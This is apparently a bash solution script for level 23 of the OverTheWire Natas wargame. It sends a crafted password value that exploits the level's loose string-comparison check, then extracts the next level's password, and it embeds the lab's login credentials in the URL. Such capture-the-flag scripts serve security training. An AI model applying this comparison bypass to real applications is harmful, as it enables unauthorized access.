#!/bin/bash
. ../natas.sh
natas_url="http://natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE@natas23.natas.labs.overthewire.org"
function hack() {
	password=$(request 2>&1 | grep -Po "(?<=Password:\s)[\d\w]+")
	echo $(get-natas-url "24" "$password")
}

function request {
	curl \
		-vs \
		-d "passwd=1907iloveyou" \
		$natas_url
}